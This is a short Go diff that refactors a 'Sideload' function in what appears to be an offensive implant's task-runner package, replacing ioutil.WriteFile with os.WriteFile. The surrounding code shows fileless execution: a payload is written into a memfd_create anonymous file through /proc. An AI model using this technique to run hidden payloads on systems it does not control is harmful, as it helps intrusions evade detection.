@@ -21,7 +21,6 @@ package taskrunner
 import (
 	"bytes"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/exec"
 	"runtime"
@@ -80,7 +79,7 @@ func Sideload(procName string, procArgs []string, _ uint32, data []byte, args st
 	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
 	pid := os.Getpid()
 	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
-	err = ioutil.WriteFile(fdPath, data, 0755)
+	err = os.WriteFile(fdPath, data, 0755)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Printf("Error writing file to memfd: %s\n", err)
